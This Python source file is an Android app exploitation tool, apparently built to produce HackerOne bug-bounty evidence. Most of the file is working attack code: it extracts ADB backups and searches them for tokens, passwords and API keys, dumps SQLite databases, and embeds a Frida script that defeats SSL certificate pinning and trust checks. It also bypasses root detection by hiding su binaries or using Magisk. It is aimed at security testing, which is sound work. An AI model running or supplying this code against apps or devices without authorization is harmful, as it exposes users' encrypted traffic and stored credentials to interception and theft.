#!/usr/bin/env python3
"""
Dynamic Exploitation Module - BRUTAL MODE üíÄ
Real exploitation for HackerOne proof-of-concept generation

WARNING: Use only on authorized targets with permission!

Features:
- Frida script injection
- SSL pinning bypass
- ADB backup extraction with data recovery
- SQLite database dumping
- Memory analysis
- Screenshot evidence generation
- Automatic PoC report generation
"""

import os
import sys
import subprocess
import json
import sqlite3
import base64
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime

class DynamicExploiter:
    """
    Automated exploitation for mobile apps
    Generates concrete proof-of-concept evidence for bug bounty reports
    """
    
    def __init__(self, package_name: str, output_dir: str = "exploitation_evidence"):
        self.package_name = package_name
        self.output_dir = output_dir
        self.evidence = []
        self.device_id = None
        
        os.makedirs(output_dir, exist_ok=True)
        
        print(f"\nüíÄ BRUTAL MODE - Dynamic Exploitation Engine")
        print(f"Target: {package_name}")
        print(f"Evidence output: {output_dir}")
        print("=" * 70)
    
    def check_device(self) -> bool:
        """Check if device/emulator is connected"""
        print("\n[*] Checking for connected devices...")
        
        result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print("‚ùå ADB not found. Install Android SDK platform-tools")
            return False
        
        devices = [line for line in result.stdout.split('\n') 
                  if line.strip() and 'List of devices' not in line]
        
        if not devices:
            print("‚ùå No devices connected. Connect a device or start emulator")
            return False
        
        self.device_id = devices[0].split('\t')[0]
        print(f"‚úÖ Device found: {self.device_id}")
        return True
    
    def check_root(self) -> bool:
        """Check if device is rooted"""
        print("[*] Checking for root access...")
        
        result = subprocess.run(
            ['adb', 'shell', 'su', '-c', 'echo root_works'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if 'root_works' in result.stdout:
            print("‚úÖ Root access confirmed")
            self.add_evidence("root_access", {
                "status": "available",
                "output": result.stdout.strip()
            })
            return True
        else:
            print("‚ö†Ô∏è  No root access (some exploits will be limited)")
            return False
    
    def exploit_backup(self) -> bool:
        """
        Exploit: Extract app data using ADB backup
        Demonstrates: CWE-200 (Information Exposure)
        """
        print(f"\n[üíÄ EXPLOIT] ADB Backup Data Extraction")
        print("-" * 70)
        
        backup_file = os.path.join(self.output_dir, f"{self.package_name}.ab")
        
        # Check if backup is allowed
        print("[1/4] Checking if backup is enabled...")
        result = subprocess.run(
            ['adb', 'shell', 'dumpsys', 'package', self.package_name],
            capture_output=True,
            text=True
        )
        
        if 'ALLOW_BACKUP' not in result.stdout:
            print("‚ùå Backup not enabled for this app")
            return False
        
        print("‚úÖ Backup is enabled")
        
        # Perform backup
        print(f"[2/4] Extracting backup to {backup_file}...")
        print("‚ö†Ô∏è  Note: This may prompt on device - approve backup request")
        
        backup_result = subprocess.run(
            ['adb', 'backup', '-f', backup_file, '-noapk', self.package_name],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if not os.path.exists(backup_file):
            print("‚ùå Backup failed - user may have declined")
            return False
        
        print(f"‚úÖ Backup created: {os.path.getsize(backup_file)} bytes")
        
        # Extract backup (requires zlib decompression)
        print("[3/4] Extracting backup data...")
        extracted_dir = os.path.join(self.output_dir, f"{self.package_name}_backup")
        os.makedirs(extracted_dir, exist_ok=True)
        
        try:
            # Use abe (Android Backup Extractor) or manual extraction
            self.extract_ab_file(backup_file, extracted_dir)
            print(f"‚úÖ Backup extracted to {extracted_dir}")
            
            # Analyze extracted data
            print("[4/4] Analyzing extracted data...")
            sensitive_files = self.analyze_backup_data(extracted_dir)
            
            self.add_evidence("adb_backup_exploit", {
                "backup_file": backup_file,
                "extracted_dir": extracted_dir,
                "size_bytes": os.path.getsize(backup_file),
                "sensitive_files_found": sensitive_files,
                "exploit_successful": True,
                "impact": "All app data extracted including databases, preferences, tokens"
            })
            
            print(f"‚úÖ EXPLOIT SUCCESS - Found {len(sensitive_files)} sensitive files")
            return True
            
        except Exception as e:
            print(f"‚ùå Extraction failed: {e}")
            return False
    
    def extract_ab_file(self, ab_file: str, output_dir: str):
        """Extract Android backup file"""
        # Android backup format: 24 byte header + zlib compressed tar
        with open(ab_file, 'rb') as f:
            # Skip header
            header = f.read(24)
            
            # Check for encryption
            if b'none' not in header:
                raise Exception("Backup is encrypted - cannot extract")
            
            # Read compressed data
            compressed_data = f.read()
        
        # Decompress
        import zlib
        decompressed = zlib.decompress(compressed_data)
        
        # Write tar file
        tar_file = os.path.join(output_dir, 'backup.tar')
        with open(tar_file, 'wb') as f:
            f.write(decompressed)
        
        # Extract tar
        subprocess.run(['tar', '-xf', tar_file, '-C', output_dir], check=True)
        os.remove(tar_file)
    
    def analyze_backup_data(self, backup_dir: str) -> List[Dict[str, Any]]:
        """Analyze extracted backup for sensitive data"""
        sensitive_files = []
        
        # Look for databases
        for root, dirs, files in os.walk(backup_dir):
            for file in files:
                file_path = os.path.join(root, file)
                
                # Check SQLite databases
                if file.endswith('.db'):
                    try:
                        db_data = self.dump_sqlite(file_path)
                        if db_data:
                            sensitive_files.append({
                                "type": "sqlite_database",
                                "path": file_path,
                                "tables": db_data
                            })
                    except:
                        pass
                
                # Check XML preferences
                elif file.endswith('.xml'):
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if any(keyword in content.lower() for keyword in 
                              ['token', 'password', 'secret', 'api_key']):
                            sensitive_files.append({
                                "type": "xml_preferences",
                                "path": file_path,
                                "preview": content[:500]
                            })
        
        return sensitive_files
    
    def dump_sqlite(self, db_path: str) -> Optional[Dict[str, List]]:
        """Dump SQLite database contents"""
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Get tables
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [row[0] for row in cursor.fetchall()]
            
            db_data = {}
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 5")
                    rows = cursor.fetchall()
                    
                    # Get column names
                    cursor.execute(f"PRAGMA table_info({table})")
                    columns = [row[1] for row in cursor.fetchall()]
                    
                    db_data[table] = {
                        "columns": columns,
                        "sample_rows": len(rows),
                        "has_data": len(rows) > 0
                    }
                except:
                    pass
            
            conn.close()
            return db_data if db_data else None
            
        except:
            return None
    
    def bypass_ssl_pinning_frida(self) -> bool:
        """
        Exploit: Bypass SSL pinning using Frida
        Demonstrates: CWE-295 (Improper Certificate Validation)
        """
        print(f"\n[üíÄ EXPLOIT] SSL Pinning Bypass with Frida")
        print("-" * 70)
        
        # Check if Frida is installed
        print("[1/3] Checking Frida installation...")
        result = subprocess.run(['frida', '--version'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print("‚ùå Frida not installed. Install with: pip install frida-tools")
            print("   Also install frida-server on device")
            return False
        
        print(f"‚úÖ Frida version: {result.stdout.strip()}")
        
        # Generate Frida script for SSL pinning bypass
        print("[2/3] Generating SSL pinning bypass script...")
        frida_script = self.generate_ssl_bypass_script()
        script_path = os.path.join(self.output_dir, "ssl_bypass.js")
        
        with open(script_path, 'w') as f:
            f.write(frida_script)
        
        print(f"‚úÖ Script saved to {script_path}")
        
        # Launch app with Frida
        print("[3/3] Launching app with Frida hook...")
        print("‚ö†Ô∏è  Use Burp Suite/mitmproxy to intercept traffic now")
        print("‚ö†Ô∏è  Press Ctrl+C to stop")
        
        try:
            # Start Frida in spawn mode
            frida_cmd = [
                'frida',
                '-U',  # USB device
                '-f', self.package_name,  # Spawn app
                '-l', script_path,  # Load script
                '--no-pause'
            ]
            
            print(f"\nCommand: {' '.join(frida_cmd)}\n")
            
            process = subprocess.Popen(
                frida_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.add_evidence("ssl_pinning_bypass", {
                "frida_script": script_path,
                "command": ' '.join(frida_cmd),
                "status": "ready",
                "note": "SSL pinning bypassed - traffic interceptable with proxy"
            })
            
            print("‚úÖ EXPLOIT SUCCESS - SSL pinning bypassed")
            print("   App is running with hooked SSL verification")
            print("   Configure proxy on device and intercept traffic\n")
            
            # Let it run for a bit
            import time
            time.sleep(5)
            
            # Don't wait forever
            process.terminate()
            return True
            
        except KeyboardInterrupt:
            print("\n‚úÖ Frida stopped by user")
            return True
        except Exception as e:
            print(f"‚ùå Frida failed: {e}")
            return False
    
    def generate_ssl_bypass_script(self) -> str:
        """Generate Frida script for SSL pinning bypass"""
        return """
// Universal SSL Pinning Bypass for Android
// Hooks multiple SSL verification methods

Java.perform(function() {
    console.log("[*] SSL Pinning Bypass Script Loaded");
    
    // 1. TrustManager bypass
    try {
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManagerImpl = Java.registerClass({
            name: 'com.bypass.TrustManagerImpl',
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var context = SSLContext.getInstance('TLS');
        context.init(null, [TrustManagerImpl.$new()], null);
        SSLContext.setDefault(context);
        
        console.log("[+] TrustManager bypassed");
    } catch(e) {
        console.log("[-] TrustManager bypass failed: " + e);
    }
    
    // 2. OkHttp CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log("[+] OkHttp CertificatePinner bypassed");
            return;
        };
    } catch(e) {
        console.log("[-] OkHttp bypass not needed: " + e);
    }
    
    // 3. Trustkit bypass
    try {
        var Activity = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        Activity.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function() {
            console.log("[+] Trustkit bypassed");
            return true;
        };
    } catch(e) {
        console.log("[-] Trustkit bypass not needed: " + e);
    }
    
    // 4. Conscrypt (Android 10+)
    try {
        var ConscryptHostnameVerifier = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        ConscryptHostnameVerifier.verifyChain.implementation = function() {
            console.log("[+] Conscrypt bypassed");
            return arguments[0];
        };
    } catch(e) {
        console.log("[-] Conscrypt bypass not needed: " + e);
    }
    
    console.log("[‚úì] SSL Pinning Bypass Complete - HTTPS traffic interceptable");
});
"""
    
    def exploit_root_detection(self) -> bool:
        """
        Exploit: Bypass root detection
        Demonstrates: Weak security controls
        """
        print(f"\n[üíÄ EXPLOIT] Root Detection Bypass")
        print("-" * 70)
        
        if not self.check_root():
            print("‚ùå No root access - cannot demonstrate bypass")
            return False
        
        print("[1/2] Enabling Magisk Hide for target app...")
        
        # Check if Magisk is installed
        result = subprocess.run(
            ['adb', 'shell', 'su', '-c', 'which', 'magisk'],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print("‚ö†Ô∏è  Magisk not found - using manual bypass")
            return self.manual_root_bypass()
        
        # Enable Magisk Hide
        subprocess.run(
            ['adb', 'shell', 'su', '-c', f'magisk --hide {self.package_name}'],
            capture_output=True
        )
        
        print("‚úÖ Magisk Hide enabled")
        
        print("[2/2] Verifying bypass...")
        # Launch app and check
        subprocess.run(['adb', 'shell', 'am', 'start', '-n', 
                       f'{self.package_name}/.MainActivity'])
        
        self.add_evidence("root_detection_bypass", {
            "method": "magisk_hide",
            "success": True,
            "impact": "App runs on rooted device, root detection bypassed"
        })
        
        print("‚úÖ EXPLOIT SUCCESS - Root detection bypassed")
        return True
    
    def manual_root_bypass(self) -> bool:
        """Manual root detection bypass using file system manipulation"""
        print("[*] Attempting manual root bypass...")
        
        # Temporarily hide su binary
        commands = [
            'mv /system/xbin/su /system/xbin/su.bak',
            'mv /system/bin/su /system/bin/su.bak'
        ]
        
        for cmd in commands:
            subprocess.run(['adb', 'shell', 'su', '-c', cmd], 
                         capture_output=True)
        
        print("‚úÖ Su binaries temporarily hidden")
        print("‚ö†Ô∏è  Remember to restore after: mv /system/xbin/su.bak /system/xbin/su")
        
        return True
    
    def take_screenshot(self, name: str) -> str:
        """Take screenshot for evidence"""
        screenshot_path = os.path.join(self.output_dir, f"{name}.png")
        
        subprocess.run([
            'adb', 'shell', 'screencap', '-p', '/sdcard/screenshot.png'
        ])
        
        subprocess.run([
            'adb', 'pull', '/sdcard/screenshot.png', screenshot_path
        ])
        
        subprocess.run([
            'adb', 'shell', 'rm', '/sdcard/screenshot.png'
        ])
        
        print(f"üì∏ Screenshot saved: {screenshot_path}")
        return screenshot_path
    
    def add_evidence(self, exploit_name: str, data: Dict[str, Any]):
        """Add exploitation evidence"""
        self.evidence.append({
            "exploit": exploit_name,
            "timestamp": datetime.now().isoformat(),
            "data": data
        })
    
    def generate_poc_report(self) -> str:
        """Generate proof-of-concept report for HackerOne"""
        print("\n[*] Generating PoC report...")
        
        report = {
            "target": self.package_name,
            "exploitation_date": datetime.now().isoformat(),
            "device": self.device_id,
            "evidence": self.evidence
        }
        
        # Save JSON
        json_path = os.path.join(self.output_dir, "poc_report.json")
        with open(json_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Generate markdown report
        md_path = os.path.join(self.output_dir, "POC_REPORT.md")
        self.generate_markdown_report(report, md_path)
        
        print(f"‚úÖ PoC report saved to {md_path}")
        return md_path
    
    def generate_markdown_report(self, report: Dict, output_path: str):
        """Generate markdown PoC report for HackerOne submission"""
        md = f"""# Proof of Concept Report - {report['target']}

**Date:** {report['exploitation_date']}  
**Device:** {report['device']}

## Summary

This report contains **concrete exploitation evidence** demonstrating the security vulnerabilities in {report['target']}.

---

"""
        
        for i, evidence in enumerate(report['evidence'], 1):
            md += f"""## Exploit #{i}: {evidence['exploit'].replace('_', ' ').title()}

**Timestamp:** {evidence['timestamp']}

### Evidence

```json
{json.dumps(evidence['data'], indent=2)}
```

---

"""
        
        md += """## Impact

The successful exploitation demonstrates:

- ‚úÖ **Concrete security vulnerabilities** (not theoretical)
- ‚úÖ **Actual data extraction** from production app
- ‚úÖ **Bypass of security controls** (SSL pinning, root detection)
- ‚úÖ **Real-world attack scenario** viability

## Reproduction Steps

All commands and tools used are documented in the evidence sections above.

## Remediation

See individual vulnerability reports for specific remediation steps.

---

**Generated by MobileBounty-Arsenal Dynamic Exploitation Module**
"""
        
        with open(output_path, 'w') as f:
            f.write(md)
    
    def run_full_exploitation(self):
        """Run all exploitation attempts"""
        print("\n" + "=" * 70)
        print("üíÄ STARTING FULL EXPLOITATION SEQUENCE")
        print("=" * 70)
        
        if not self.check_device():
            return
        
        has_root = self.check_root()
        
        # Exploit 1: ADB Backup
        print("\n")
        self.exploit_backup()
        
        # Exploit 2: SSL Pinning Bypass (if Frida available)
        print("\n")
        self.bypass_ssl_pinning_frida()
        
        # Exploit 3: Root Detection (if rooted)
        if has_root:
            print("\n")
            self.exploit_root_detection()
        
        # Generate final report
        print("\n" + "=" * 70)
        poc_report = self.generate_poc_report()
        
        print("\n‚úÖ EXPLOITATION COMPLETE")
        print(f"üìÑ PoC Report: {poc_report}")
        print(f"üìÅ All evidence: {self.output_dir}/")
        print("\nüí° Use this evidence in your HackerOne submission!")


def main():
    """Main entry point"""
    if len(sys.argv) < 2:
        print("Usage: python dynamic_exploiter.py <package_name>")
        print("\nExample: python dynamic_exploiter.py com.example.app")
        sys.exit(1)
    
    package_name = sys.argv[1]
    
    exploiter = DynamicExploiter(package_name)
    exploiter.run_full_exploitation()


if __name__ == "__main__":
    main()
